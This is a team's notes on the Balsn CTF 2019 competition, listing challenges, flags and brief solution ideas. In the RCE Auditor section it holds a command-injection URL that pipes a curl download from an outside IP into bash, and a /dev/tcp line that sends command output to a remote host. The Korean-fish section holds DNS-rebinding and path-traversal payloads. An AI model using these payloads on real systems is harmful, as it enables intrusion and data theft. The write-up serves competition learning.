# Balsn CTF 2019
| Solved             | Category | Points | Solver        |
| ------------------ | -------- | ------ | ------------- |
| Welcome to hell    | Welcome  | 106    |               |
| 卍乂Oo韓國魚oO乂卍 | Web      | 527    | phwu          |
| listcomp ppm       | PPM      | 371    | Chia-Hsuan Hu |
| SecureCheck        | Misc     | 330    | Wei-Ti Su     |

## Smart Contract

### simple sol aeg
`smart contract` `957 pts` `3 solves`

> Solidity Automatic Exploit Generation? 
> try it: 
> `nc aab2596ac4a422a9f803ed317089c399b818bb72.balsnctf.com 30731`
> 
> Be a King
> * Give you a contract bytecode, give me transaction data to be a king.
> * Timeout = 10 seconds per challenge.
> * You can call `isKing()` to verify it.
> * pragma solidity 0.4.25
> 
> This challenge requires Proof-of-Work (PoW). We have already finished the code for you. Please see pow.balsnctf.com . 
> 
> Author: ysc
> 
> Hint:
> * You need to call a function to let `isKing()` return true
> * We only have 3 contract templates. Try hard to parse contract bytecode or use some tools.

### Bank
`smart contract` `1000 pts` `1 solves`

> Again, as those ctfs did in the past, we also implemented our 100% secure bank system, but on blockchain this time.
> 
> Game environment: Ropsten Testnet
> 
> `nc bank.balsnctf.com 12345`
> 
> This challenge requires Proof-of-Work (PoW). We have already finished the code for you. Please see pow.balsnctf.com
> 
> Author: shw
> 
> UPDATE (10/6 00:58 UTC+8): After tested, our server and Ropsten Testnet are both working, while etherscan is not. If you want to inspect your transactions or interact with your game contracts, please try other tools.
> A reminder: You could choose option 4 to get the source code, and test your payload locally before you send it to Ropsten.

### Creativity
`smart contract` `1000 pts` `1 solves`

> Be concise, or be creative.
> 
> Game environment: Ropsten Testnet
> 
> `nc creativity.balsnctf.com 12345`
> 
> This challenge requires Proof-of-Work (PoW). We have already finished the code for you. Please see pow.balsnctf.com
> 
> Author: shw
> 
> UPDATE (10/6 00:58 UTC+8): After tested, our server and Ropsten Testnet are both working, while etherscan is not. If you want to inspect your transactions or interact with your game contracts, please try other tools.
> A reminder: You could choose option 4 to get the source code, and test your payload locally before you send it to Ropsten.


## Misc

### SecureCheck
`misc` `330 pts` `31 solves` `Balsn{}` `Wei-Ti Su`

> No system call no pain
> 
> nc securecheck.balsnctf.com 54321
> 
> [Download](https://static.balsnctf.com/securecheck/3aad636a0c6cb3123956bed40bc5fb2ed1f0a505bba03710b58ed4910dd48a84/release.zip)
> 
> Author: Billy

### pyshv1
`misc` `572 pts` `13 solves` `Balse{p1Ck1iNg_s0m3_PiCklEs}` `phwu (AFTER END)`

> Continuous delivery is awesome.
> We deploy our code to production whenever we can.
> No code, no vulnerability.
> Everything works great.
> 
> `nc pysh1.balsnctf.com 5421`
> 
> Decrypt v2/v3 with flag from previous level using following command:
> 
> `openssl enc -d -aes-256-cbc -salt -pbkdf2 -in task.tar.gz.enc -out task.tar.gz`
> 
> download link: [here](https://static.balsnctf.com/pyshv1/T30GaNFFw9bZtpwkEDyCsY7DtCM2jUqA/pyshv1.tar.gz)
> 
> Author: sasdf
> 
> NOTE the domain is updated. It is `pysh1.balsnctf.com`
> 
> Python version: python 3.6

1. Understand Pickle protocol

   The backend is a stack-based virtual machine.
   To list availables opcodes, read `/usr/lib/python3.7/pickle.py`.
   For more information, read `/usr/lib/python3.7/pickletools.py`.
   
2. Construct payload

   Hmm... the script on Google Drive directly is the best explaination.

### pyshv2
`misc` `857 pts` `5 solves`

> Continuous delivery is awesome.
> We deploy our code to production whenever we can.
> No code, no vulnerability.
> Everything works great.
> 
> `nc pysh2.balsnctf.com 5422`
> 
> Decrypt v2/v3 with flag from previous level using following command:
> 
> `openssl enc -d -aes-256-cbc -salt -pbkdf2 -in task.tar.gz.enc -out task.tar.gz`
> 
> download link: [here](https://static.balsnctf.com/pyshv2/ml9rwoatg0p9UMipmFKw7cD88ZbS8o6N/pyshv2.tar.gz.enc)
> 
> Author: sasdf
> 
> NOTE the domain is updated. It is `pysh2.balsnctf.com`
> 
> Hint: 
> google this:
> ![](https://i.imgur.com/8LKrW2c.png)
> 
> img source: milspecmonkey.com
> 
> Python version: python 3.6

### pyshv3
`misc` `906 pts` `4 solves`

> Continuous delivery is awesome.
> We deploy our code to production whenever we can.
> No code, no vulnerability.
> Everything works great.
> 
> `nc pysh3.balsnctf.com 5423`
> 
> Decrypt v2/v3 with flag from previous level using following command:
> 
> `openssl enc -d -aes-256-cbc -salt -pbkdf2 -in task.tar.gz.enc -out task.tar.gz`
> 
> download link: [here](https://static.balsnctf.com/pyshv3/0A60mF4UkK92aCHhbr4rE66pSzSDpmVV/pyshv3.tar.gz.enc)
> 
> Author: sasdf
> 
> NOTE the domain is updated. It is `pysh3.balsnctf.com`
> 
> Python version: python 3.6

### JPcode
`misc` `957 pts` `3 solves`

> シェルコード だいすき
> I love shellcode <3 
> `nc jpcode.balsnctf.com 19091`
> 
> [Download](https://static.balsnctf.com/jpcode/d20a631229939a1acf9f2b5aeeb9df3d7f72b11a293f6aa9d9dd5b2aa0a4755e/jpcode.zip)
> 
> Author: how2hack

### john
`misc` `1000 pts` `1 solves`

> Plaintext is unacceptable in our confidential flag checker.
> All traffics are encrypted.
> 
> Note: Make sure you have a standard network setup. If you're not sure, try to use GCP.
> Our solution is tested on AWS (us-east) and GCP (us-central & asia-east).
> `nc john.balsnctf.com 5452`
> 
> download link: [here](https://static.balsnctf.com/john/d5oguItz7NGqLTuJrwdHOGMXWQSBbhGu/john.tar.gz)
> 
> Author: sasdf
> 
> Hint: https://en.wikipedia.org/wiki/Nagle's_algorithm

### Need_some_flags
`misc` `1000 pts` `1 solves`

> To host a CTF, we need tons of flags.
> Would you like to help us? We will take your flags after the end of CTF
> Please make sure your flags work great under Ubuntu 18.04 and python 2.7.15
> `nc flagsss.balsnctf.com 10121`
> 
> download link: [here](https://static.balsnctf.com/Need_some_flags/hKbcdwVcWQWb9hfUEmVm8fRu8Btwpw5b/challenge.zip)
> 
> 
> 
> Author: sces60107
> 
> Hint: I hope this docker file can help you test your exploit locally. This challenge is actually easier than you think it is
> [Dockerfile](https://static.balsnctf.com/Need_some_flags/hKbcdwVcWQWb9hfUEmVm8fRu8Btwpw5b/Needsomeflag.zip)

### Need_some_flags_2
`misc` `1000 pts` `1 solves`

> Need more flags !!!!
> nc flagsss2.balsnctf.com 10122
> 
> download link: [here](https://static.balsnctf.com/Need_some_flags_2/Ek3nT85MGYGSTbj5TI97bTR62bUrEfnh/needsomeflag2.zip)
> 
> Author: sces60107


## Pwn

### KrazyNote
`pwn` `572` `13 solves`

> Hide your secret in kernal space
> 
> user: knote, passwd:knote
> 
> UPDATE: Three servers host the same challenge.
> 
> `ssh knote@krazynote.balsnctf.com -p 54321`
> `ssh knote@krazynote-2.balsnctf.com -p 54321`
> `ssh knote@krazynote-3.balsnctf.com -p 54321`
> 
> Finish your exploit before you connect to Remote. And try minimize your binary. 300 seconds should be enough for you to upload your exploit to the server.
> 
> [Download](https://static.balsnctf.com/krazynote/07bf32d42a2c7085bb4d66886fedc38df2fbd706a3d0653122a36dede021b4e0/release.zip)
>
> Author: Billy

### SimpleLanguage
`pwn` `957 pts` `3 solves`

> Billy love ROP !? 
> 
> `nc simplelanguage.balsnctf.com 54321`
> 
> [Download](https://static.balsnctf.com/SimpleLanguage/814983423fa95aa3364e51b1ebaa38ece3e857d661836d6f5f10aebca51eec07/SimpleLanguage_b8dc0cfc7c3c19b4292c6f06516a3cc4bebbab1e.tar.gz)
> 
> Author: tens

### SecPwn
`pwn` `957 pts` `3 solves`

> Playing classic pwn in 2019. 
> 
> `nc secpwn.balsnctf.com 4597`
> 
> Linux 4.14.143-91.122.amzn1.x86_64 #1 SMP Wed Sep 11 00:43:34 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 
> 
> [Download](https://static.balsnctf.com/secpwn/2a928f2ba7bedd4a173dead4f3475a94eac276acb3363821175a57fec9644675/secpwn.zip)
> 
> Author: yuawn

### PlainNote
`pwn` `1000 pts` `1 solves`

> Write some notes in 2019
> 
> `nc plainnote.balsnctf.com 54321`
> 
> [Download](https://static.balsnctf.com/plainnote/04e13fc05014ddbbe5f5cc985c0c08305be9be0b60baeded7839c4a3312f0357/release.zip)
> 
> This challenge requires Proof-of-Work (PoW). We have already finished the code for you. Please see pow.balsnctf.com
> 
> Author: Billy

### securenote
`pwn` `1000 pts` `0 solves`

> Notes family is known to be pwned, we secure it with SOTA encryption.
> There's nothing you can control.
> `nc securenote.balsnctf.com 5454`
> 
> download link: [here](https://static.balsnctf.com/securenote/F7K8tThUk03aYtcwlK1j0o8nwmC2jrip/securenote.tar.gz)
> 
> Author: sasdf
> 
> Hint: For crypto part, all you need to know is in this wiki page: Block cipher mode of operation

### Machbook
`pwn` `1000 pts` `1 solves`

Mach Apple Great Again!!!
https://drive.google.com/open?id=1-8IauoBTbeuoCS_HN8ngxNtaXhxjsuLO
`nc machbook.balsnctf.com 19091`

download link: [here](https://static.balsnctf.com/machbook/tJjcvq0pRn4OcXg4UfI9wy043usdjQtc/machbook_public.zip)

Author: how2hack

Hint: OSX library offset will not change if system is still up


## Web

### 卍乂Oo韓國魚oO乂卍
`web` `527 pts` `15 solves` `Balsn{Korea_fish_is_good_to_eat}` `phwu`

> Taiwanese people love korean fish. 
> 
> ![](https://i.imgur.com/WOUAMVm.png)
> 
> [Server Link](http://koreanfish.balsnctf.com/)
> [Server Link 2 (Alternative)](http://koreanfish2.balsnctf.com/)
> [Server Link 3 (Alternative)](http://koreanfish3.balsnctf.com/)
> [Server Link 4 (Alternative)](http://koreanfish4.balsnctf.com/)
> 
> [Download](https://static.balsnctf.com/koreafish/d68fcc656a04423422ff162d9793606f2c5068904fced9087edc28efc411e7b7/koreafish-src.zip)
> 
> Author: Kaibro

1. IP check

   DNS Rebind
   * A.54.87.54.87.1time.140.113.194.72.1time.repeat.rebind.network
   * <span>36573657.8c71c248.rbndr.us</span>

2. URL path must conatin `korea`
   * PHP Redirection

     ```php
     header('Location: http://127.0.0.1:5000/error_page?err=../../../../../var/www/flask/templates/index.html');
     ```
    
     And use `.phtml` in the filename to bypass filter.
  
   * Flask (Mentioned in Discord channel)

     ```
     http://127.0.0.1:5000//korea//error_page?err=../../../../../var/www/flask/templates/index.html
     ```

3. `render_template_string` requires a file
   1. *POST*ing data to `phpinfo.php` will make PHP generate a temporary file under `/tmp`
   2. WIN THE RACE !!!

### Warmup
`web` `857 pts` `5 solves`

> Baby PHP challenge again.
> 
> ![](https://i.imgur.com/XaY1Glh.png)
> 
> [Link](http://warmup.balsnctf.com/)
* `?op=-9&%CE%A3%3E%E2%80%95%28%23%C2%B0%CF%89%C2%B0%23%29%E2%99%A1%E2%86%92=`

### Donation
`web` `1000 pts` `0 solves`

> Do you wanna support us?
> 
> ![](https://i.imgur.com/ZfMVWr1.png)
> 
> [Link](http://donate.support.balsnctf.com/)
> [Download](https://static.balsnctf.com/donation/53ed2f4eef2b5d0602f726d2ed33b1c7afb53f5322daa573ffc96a2c71816ac1/Donate.zip)
> 
> Hint:
> Why are you so serious?
> Maybe you need:
> ![](https://i.imgur.com/Vkh8Lhn.png)
> 
> Author: Cyku


### RCE Auditor
`web` `1000 pts` `1 solves`

> `http://rce-auditor.balsnctf.com/`
> 
> [Download the source code here](https://static.balsnctf.com/rce-auditor/0bb8ba89353114c04ccb3da4d361c3e99a9120a4550a085197e3114b9771e4a0/eval_server.c)
> 
> Chrome has retired the XSS Auditor, but how about the RCE Auditor? The evil eval_server is listening on `127.0.0.1:6666`, but RCE Auditor protects us. 
> 
> 
> 
> This challenge requires Proof-of-Work (PoW). We have already finished the code for you. Please see pow.balsnctf.com . 
> 
> Author: bookgin

> ***Unsolved, just my idea***
> [name=phwu]

1. Connect to port 6666

   After testing, the browser used by the server is `HeadlessChromium/76.0.3809.100`.
   For safety, Chromium restricts the accesses to unsafe ports. [[reference]](https://chromium.googlesource.com/chromium/src.git/+/refs/heads/master/net/base/port_util.cc#110)

2. The characters used in URL path cannot be encoded

   ```
   http://127.0.0.1:6666/flag?;curl${IFS}-s${IFS}http://140.113.194.72:5678/payload|bash${IFS};
   ```

3. Leak information

   The content of `http://140.113.194.72:5678/payload` is as the following.
   ```
   ls >&/dev/tcp/140.113.194.72/8888
   ```

### Silhouettes
`web` `1000 pts` `2 solves`

> `http://silhouettes.balsnctf.com/`
> 
> BGM: [American Football - Silhouettes](https://www.youtube.com/watch?v=-TcUvXzgwMY)
> 
> Author: bookgin

### Images and Words
`web` `1000 pts` `0 solves`

> `http://images-and-words.balsnctf.com/`
> 
> [Download the source code here](http://static.balsnctf.com/images-and-words/433c7b1c1e808891fc969fa6f4f402cfd02bf5ccf656307f9054cffe71761b3a/file.tar.gz)
> 
> BGM: [Dream Theater - Images and Words](https://www.youtube.com/watch?v=MkLIJw-fOIQ&list=PL8ANB2FxMC6WnDQDe_MS-OioyR5GEgEvC)
> 
> 
> This challenge requires Proof-of-Work (PoW). We have already finished the code for you. Please see pow.balsnctf.com . 
> 
> Author: bookgin

[Official Writeup](https://github.com/BookGin/my-ctf-challenges/tree/master/balsn-ctf-2019/images-and-words)


## Rev

### Hack Compiler
`rev` `690 pts` `9 solves`

> There is a password checker on a Hack machine.
> Can you solve it?
> 
> 
> Compiler: https://github.com/qazwsxedcrfvtg14/Hack-Assembly-Language-Compiler
> 
> download link: [here](https://static.balsnctf.com/hack-compiler/7iJOgwN2bDm9ssTTjy6L3iKW9i9qntUZ/main.asm)
> Hint: https://github.com/johnchen902/nand2tetrisVM2 https://static.balsnctf.com/hack-compiler/7iJOgwN2bDm9ssTTjy6L3iKW9i9qntUZ/program
> 
> Author: qazwsxedcrfvtg14

### vim
`rev` `726 pts` `8 solves`

> A vim challenge written with [kakoune](https://kakoune.org/).
> 
> download link: [here](https://static.balsnctf.com/vim/RTNKCum2XQSc7Cy07j20PvJnpGWctxWG/vim.tar.gz)
> 
> Author: sasdf
> 
> Hint: There are something like calling convention, register, etc. BTW, web browsers are good viewers for such long one-line document.

### plam
`rev` `1000 pts` `1 solves`

> I tried my best, but it's still a little bit slow.
> It will tell you the result after several years.
> 
> download link: [here](https://static.balsnctf.com/plam/Dmf3FQ9pdlHtqEX91ywKLsYq9K0Aimsd/plam.tar.gz)
> The program is a flag checker. 
> 
> Author: sasdf
> 
> Hint: 
> ![](https://i.imgur.com/gfY3yvZ.png)


## Crypto

### collision
`crypto` `726 pts` `8 solves`

> md5 is broken, sha1 is broken, but our authenticator survives.
> Note: It may takes several seconds to check the password. Please be patient.
> `nc collision.balsnctf.com 5451`
> 
> download link: [here](https://static.balsnctf.com/collision/RTNBidfsTqN0UO6PbQpe5MWY3nlFIaaA/collision.tar.gz)
> 
> Author: sasdf

### unpredictable
`crypto` `810 pts` `6 solves`

> Our team, Balsn, is full of prophets. We know the future, we know the flag. How about you?
> 
> download link: [here](https://static.balsnctf.com/unpredictable/IxN9Hyk6eXSzmvjyq4nCrznD2bq3GY5Y/unpredictable.tar.gz)
> 
> Author: sasdf

### harc4
`crypto` `857 pts` `5 solves`

> Four is the only number whose name in English has the same number of letters as its value, and the name of our favorite cipher, RC4, ends with 4.
> Coincidence? I don’t think so!
> `nc harc4.balsnctf.com 5450`
> 
> download link: [here](https://static.balsnctf.com/harc4/8EjDJA4noVtuW8P2oaF0x44luCXArC7D/harc4.tar.gz)
> 
> Author: sasdf

### shellcode writer
`crypto` `906 pts` `4 solves`

> Tired of AES pwn? Try some RSA pwn!!!
> Give me your encrypted message then I will **write** it out for you!
> `nc shellcode.balsnctf.com 4001`
> 
> download link: [here](https://static.balsnctf.com/shellcode-writer/KpI0lpEfqFsEuRNscccMGkYosXepKpwM/shellcode_writer.tar.gz)
> 
> Author: fweasd


## Web and Golan

### Gopher Party
`web, golang` `857 pts` `5 solves`

> Welcome to gopher party! Sign up to register the event!
> (O口o)!!!(O口o)!!!(O口o)!!!(O口o)!!!(O口o)!!!(O口o)!!!(O口o)!!!
> 
> https://gopherparty.balsnctf.com
> 
> https://github.com/balsnctf/gopher-party
> 
> What is the smallest scheduling unit of golang, and how it works? Maybe there's some features/tricks in it.
> 
> Xun


## PPM

### listcomp ppm
`ppm` `371 pts` `26 solves` `Balse{8_8_l13t_c0mp63h3ns10n_0r_A_5en8_80x_ch01l3n93}` `Chia-Hsuan Hu`

> Solve 3 super easy list-comp challenges!!!
> Short! Shorter!! Shortest!!!
> 
> `nc easiest.balsnctf.com 9487`
> 
> UPDATE: the challenge runs by `python3.6` UPDATE: the original code should already be list comprehension
> 
> Question1: The first line would contain a positive integer N. Then there would be N lines below. Each line contains two integer A and B. Please output the corresponding A+B.
> Example Input:
> 3
> 1 2
> 3 4
> 5 6
> 
> Example Output:
> 3
> 7
> 11
> 
> Input Length Limit: 75
> 
> 
> Question2: This is the knapsack problem that you know. Sasdffan is going to buy some junk foods. However, he has only limited budgets M. Each junk food would have two attributes, the cost of buying the junk food and the value of eating the junk food. The first line contains two positive integers N and M. Then, there would be N lines below. Each line contains two positive integers v and c. (v: value, c: cost). Please output the maximum value that Sasdffan could get after consuming all the junk foods he bought. Caution: Each junk food could only be bought once.
> 1000 <= N <= 2000, 1 <= M <= 3000, 1 <= c <= 3000, v > 0 
> Example Input:
> 3 5
> 1 2
> 1 3
> 2 2
> 
> Example Output:
> 3
> 
> Input Length Limit: 200
> 
> 
> Question3: Depth of the tree. There is a size N tree with node index from 0 to N-1. The first line is an integer N (tree size). Then, there would be N numbers in the next line each represents the father of the node. (0 is always the root). 10 <= N <=10000. Please notice that for any i, father[i] < i.
> Example Input:
> 3
> 0 0 1
> 
> Example Output:
> 2
> 
> Input Length Limit: 300
> 
> 
> Author: hortune

1. Can not use assignments in `list`.
   
   Use `for var in [val]` to initialize.
   Use `pop()` and `insert()` to modify list.

2. Solution

   ```python
   # p1
   [print(sum(map(int,input().split())))for _ in range(int(input()))]
   
   # p2
   [[[[b.insert(i,b[i+c]+v)or b.pop(i+1)for i in range(int(m)-c+1)if b[i+c]+v>b[i]]for v,c in[map(int,input().split())]]for _ in range(int(n))]and print(b[0])for n,m,b in [input().split()+[[0]*3000]]]
   
   # p3
   [[t.insert(i, t[p]+1) or t.pop(i+1) for i, p in enumerate(map(int,input().split()))] and print(max(t) - 1) for n, t in [[int(input()), [0]*10010]]]
   ```


## Welcome

### Welcome to hell
`welcome` `106 pts` `720 solves` `Balse{W3lc0me_2_BalsnCTF_2019}`

> discord invite link: https://discordapp.com/invite/hfd9d66
